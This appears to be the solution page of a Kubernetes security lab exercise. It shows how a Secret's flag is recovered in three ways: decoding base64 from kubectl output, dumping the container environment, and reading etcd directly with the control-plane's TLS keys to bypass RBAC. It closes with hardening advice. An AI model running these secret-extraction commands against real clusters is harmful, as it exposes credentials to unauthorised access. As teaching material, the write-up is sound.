# Solution — base64 Is Not Encryption

The flag is `KUBE{base64_is_not_encryption}`. Here are the exfiltration paths, each a real-world technique.

## Path 1 — read the Secret and decode it

```bash
kubectl -n dojo-leaky get secret app-config -o jsonpath='{.data.FLAG}' | base64 -d; echo
# -> KUBE{base64_is_not_encryption}
```

Dump every key at once:

```bash
kubectl -n dojo-leaky get secret app-config -o go-template='
{{- range $k, $v := .data }}{{ $k }}: {{ $v | base64decode }}{{ "\n" }}{{ end }}'
```

That `.data` field is base64, **not** ciphertext. Decoding needs no key — that's the entire lesson.

## Path 2 — read it from the running container

Because the Deployment mounts the Secret via `envFrom.secretRef`, the plaintext is sitting in the process environment:

```bash
kubectl -n dojo-leaky exec deploy/billing -- env | grep FLAG
# -> FLAG=KUBE{base64_is_not_encryption}
```

This is why mounting secrets as **env vars** is weaker than mounting as **files**: env is readable by any process in the container, often leaks into crash dumps and logs, and is visible to anything that can `exec`.

## Path 3 — the attacker's view (etcd)

In a real cluster (and in this kind node), the Secret lives in etcd. With node access you could read it straight from the datastore without ever touching the API server's RBAC:

```bash
# illustrative — on the control-plane node
docker exec dojo-control-plane sh -c \
  "ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt \
   --cert=/etc/kubernetes/pki/etcd/server.crt \
   --key=/etc/kubernetes/pki/etcd/server.key \
   get /registry/secrets/dojo-leaky/app-config" | strings | grep KUBE
```

(You'll do the full etcd/attacker path for real in Course 03.)

## The fix (preview)

- **Encryption at rest:** configure an `EncryptionConfiguration` on the API server so Secrets are encrypted in etcd with a KMS or aescbc provider.
- **Least-privilege RBAC:** never grant `get`/`list` on `secrets` broadly. Scope it to the one ServiceAccount that needs the one Secret.
- **Mount as files, not env**, and prefer an external secrets operator (External Secrets Operator, Vault) so the plaintext never lives in a Kubernetes Secret at all.
